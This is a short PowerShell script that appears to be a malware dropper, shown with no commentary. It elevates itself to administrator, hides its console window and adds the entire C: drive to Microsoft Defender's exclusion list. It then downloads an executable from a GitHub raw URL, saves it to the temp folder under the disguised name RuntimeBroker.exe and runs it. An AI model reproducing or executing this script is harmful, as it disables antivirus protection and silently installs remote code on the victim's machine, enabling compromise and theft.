if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$console = [Console.Window]::GetConsoleWindow()
# 0 hide
[Console.Window]::ShowWindow($console, 0) | Out-Null

Add-MpPreference -ExclusionPath C:\

$url = "https://github.com/skizmik/hdmx/raw/refs/heads/main/XClient.exe"

$output = "$env:Temp/RuntimeBroker.exe"

Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output
